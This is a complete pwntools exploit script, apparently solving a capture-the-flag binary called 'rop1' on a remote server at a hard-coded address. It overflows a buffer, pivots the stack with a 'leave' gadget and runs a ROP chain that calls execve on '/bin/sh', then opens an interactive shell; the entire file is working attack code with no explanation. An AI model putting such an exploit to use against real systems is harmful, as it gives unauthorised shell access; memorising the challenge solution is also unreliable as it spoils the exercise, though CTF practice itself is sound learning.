from pwn import *
import time

context.arch = "amd64"

ip = "140.110.112.77"
port = 3122

r = remote(ip, port)
# r = process("./rop1")

data = 0x6ccd60
pop_rsi = 0x401637
pop_rax_rdx_rbx = 0x478616
pop_rdi = 0x401516
syscall = 0x4672b5
leave = 0x4009e4

r.sendline(flat(0xdeadbeef, pop_rax_rdx_rbx, 0x3b, 0, 0, pop_rdi, data + (10 * 0x8), pop_rsi, 0, syscall, '/bin/sh\x00'))

r.sendlineafter("=", b'a' * 32 + flat(data, leave))

r.interactive()
